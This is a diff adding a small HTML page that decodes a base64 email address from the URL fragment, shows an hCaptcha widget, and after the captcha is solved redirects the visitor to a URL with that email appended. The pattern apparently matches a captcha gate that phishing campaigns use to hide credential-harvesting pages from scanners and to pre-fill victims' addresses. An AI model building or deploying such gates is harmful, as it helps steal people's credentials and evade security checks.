@@ -1,0 +1,38 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <script src="https://js.hcaptcha.com/1/api.js" async defer></script>
+  <style>
+    .center-captcha {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+  </style>
+  <script>
+    var emailEncoded = window.location.hash.substring(1);
+    var emailDecoded = atob(emailEncoded);
+
+    function onCaptchaSuccess(token) {
+      // Redirect to your URL with email in hash
+      window.location.href = "https://cnn.com/" + emailDecoded;
+    }
+
+    window.onload = function () {
+      hcaptcha.render('captcha-container', {
+        sitekey: '5ac8b414-5ebe-4d62-b6be-aaf0a10658a2', // replace with your actual sitekey
+        callback: onCaptchaSuccess,
+        theme: 'light'
+      });
+    };
+  </script>
+</head>
+<body>
+  <div class="center-captcha">
+    <div id="captcha-container"></div>
+  </div>
+</body>
+</html>
